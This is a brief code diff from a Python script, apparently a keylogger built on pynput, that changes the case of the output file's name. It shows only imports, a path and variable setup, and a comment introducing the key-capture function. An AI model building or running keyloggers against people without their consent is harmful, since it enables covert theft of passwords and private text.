@@ -1,7 +1,7 @@
 # Importing the appropriate extension modules
 from pynput.keyboard import Listener
 # Setting a path for the keylogger to deposit output
-path = 'keyboard_Input.txt'
+path = 'keyboard_input.txt'
 keyboard_Input = []
 count = 0
 # Defining a function that stores keyboard input each time a key is pressed
